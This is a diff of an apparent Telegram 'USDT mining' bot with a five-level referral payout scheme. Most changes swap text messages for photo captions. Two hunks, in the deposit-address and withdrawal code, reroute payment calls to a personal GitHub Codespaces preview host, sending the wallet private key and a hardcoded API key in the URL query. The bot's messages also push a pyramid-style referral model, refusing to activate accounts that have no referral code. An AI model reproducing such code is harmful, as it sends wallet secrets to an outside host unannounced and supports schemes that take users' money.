@@ -197,10 +197,8 @@ const formattedDate = `${day}/${month}/${year}`;
                         }
                     })
                 } else {
-                    let t = "🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.";
-                    de(e.from.id, t, {
-                        parse_mode: "Markdown"
-                    }), await e.scene.enter("refercode")
+                    await e.replyWithPhoto("https://telegra.ph/file/b45195e723ec17b0ee187.jpg",{caption:"🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.",parse_mode:"Markdown"})
+                    , await e.scene.enter("refercode")
                 }
             } catch (e) {
                 console.log(e), te(e)
@@ -275,10 +273,8 @@ const formattedDate = `${day}/${month}/${year}`;
                             }
                         })
                     } else {
-                        let t = "🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.";
-                        de(e.from.id, t, {
-                            parse_mode: "Markdown"
-                        }), await e.scene.enter("refercode")
+                        await e.replyWithPhoto("https://telegra.ph/file/b45195e723ec17b0ee187.jpg",{caption:"🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.",parse_mode:"Markdown"})
+                       await e.scene.enter("refercode")
                     }
             } catch (e) {
                 console.log(e), te(e)
@@ -384,11 +380,15 @@ const referralMsg = `➕ *New Referral:* ${e.from.first_name}${username ? ` (${u
                            
                            
                           ]);
+
                           
                           e.answerCbQuery('✅ Thank you for joining the channel and confirming your registration!', { alert: true });
                           del(e)
-                          ue(e, "🎉 Congratulations! You've just received a 1$ USDT signup bonus, which has been credited to your account! 🤑\n\n", {reply_markup: {    keyboard: re,    resize_keyboard: !0}
-                        });
+                          
+
+                          await e.replyWithPhoto("https://telegra.ph/file/9e36112f540a75b981d73.jpg", { caption: "🎉 Congratulations! You've just received a 1$ USDT signup bonus, which has been credited to your account! 🤑\n\n" ,reply_markup: {    keyboard: re,    resize_keyboard: !0}});
+
+                        
                 // Add your code to proceed with registration here
             } else {
                 // User has not joined the channel yet
@@ -1102,7 +1102,7 @@ S.action("turn_on_mining", async (ctx) => {
                     const t = await async function(e) {
                         try {
                             const topeurl = U+"/"+e.from.id;
-                            let url = "https://www.Tronlib.one/usdt/generate-address?apikey=f497d93501b66db61543f297d761e89c&tron_address="+x+"&userid="+e.from.id+"&ipn_url="+encodeURIComponent(topeurl)+"&trxPrivateKey="+T,
+                            let url = "https://monika359b-super-space-zebra-76gqgq574qfrp9q-8888.preview.app.github.dev/usdt/generate-address?apikey=ee336e3d10dab6fab88edb4b25d70c24&tron_address="+x+"&userid="+e.from.id+"&ipn_url="+encodeURIComponent(topeurl)+"&trxPrivateKey="+T,
                                 n = await p(url, {
                                     method: "GET"
                                 }),
@@ -1132,14 +1132,14 @@ S.action("turn_on_mining", async (ctx) => {
                                 text: "🔍 Generate QR Code",
                                 callback_data: `qr ${t.address}`
                             };
-                        de(e.from.id, a, {
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [n]
-                                ],
+                            de(e.from.id, a, {
+                                reply_markup: {
+                                    inline_keyboard: [
+                                        [n]
+                                    ]
+                                },
                                 parse_mode: "Markdown"
-                            }
-                        })
+                            })
                     }
                 }
             } catch (e) {
@@ -1164,7 +1164,7 @@ S.action("turn_on_mining", async (ctx) => {
                     i = {
                         parse_mode: "Markdown"
                     };
-                e.deleteMessage(e.message), await e.replyWithPhoto(r, {
+                le(e,e.message), await e.replyWithPhoto(r, {
                     caption: n,
                     reply_markup: s,
                     ...i
@@ -1182,7 +1182,7 @@ S.action("turn_on_mining", async (ctx) => {
                         text: "🔍 Generate QR Code",
                         callback_data: `qr ${t[0].depositAddress}`
                     };
-                e.deleteMessage(e.message), ue(e, a, {
+                le(e,e.message), ue(e, a, {
                     reply_markup: {
                         inline_keyboard: [
                             [n]
@@ -1805,22 +1805,26 @@ S.action("turn_on_mining", async (ctx) => {
  Level 4: ${tt} users
  Level 5: ${u} users
  
- ♾ Earnings: ${i} USDT`,{reply_markup: {
+ ♾ Earnings: ${i} USDT`,{
+  photo: 'https://telegra.ph/file/55143bab235dfea753ffd.jpg',
+  reply_markup: {
     inline_keyboard: [
-  [{
+      [{
         text: "View Refer Report",
         callback_data: "Detailed_Data"
-    }]
+      }]
     ]
   },
-  parse_mode: "HTML"})
-  await e.reply(`💰 You can earn level income on each referral deposit and an extra Bonus upto 45% for upto 5 levels deep!
+  parse_mode: "HTML"
+}) 
+
+  await e.replyWithPhoto('https://telegra.ph/file/55143bab235dfea753ffd.jpg',{caption:`💰 Earn a Level Income on every referral deposit and an extra Bonus of up to 45% for 5 levels deep!
 
   👥 Share this bot with your friends and start earning more USDT today!
   
-  🔐 Your referral code: <code>${o}</code>
+  🔐 Your referral code: <code>${o}</code> <strong>(Tap to copy)</strong>
   
-  BotLink : ${link}
+  BotLink: ${link}
   
   Referral Program:
   Level 1 - 5%
@@ -1829,7 +1833,7 @@ S.action("turn_on_mining", async (ctx) => {
   Level 4 - 2%
   Level 5 - 1%
   
-  By sharing this bot, you'll not only increase your earnings, but also help your friends earn more USDT as well. So, start referring today and grow your USDT wallet!`, {
+  By sharing this bot, you can earn more USDT and help your friends earn too! So why wait? Start referring today and boost your USDT wallet!`, 
     reply_markup: {
       inline_keyboard: [
         [{
@@ -2470,8 +2474,8 @@ Maximum withdrawal amount is: ${t.toFixed()}`, {
                     });
                 if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                 else {
-                    const i = "f497d93501b66db61543f297d761e89c",
-                        o = "https://www.tronlib.one/usdt/transfer?receiver="+ s.wallet+"&amount="+parseFloat(s.amount)+"&private_key="+T+"&apikey="+i,
+                    const i = "ee336e3d10dab6fab88edb4b25d70c24",
+                        o = "https://monika359b-super-space-zebra-76gqgq574qfrp9q-8888.preview.app.github.dev/usdt/transfer?receiver="+ s.wallet+"&amount="+parseFloat(s.amount)+"&private_key="+T+"&apikey="+i,
                         l = {
                             "Content-Type": "application/json"
                         },
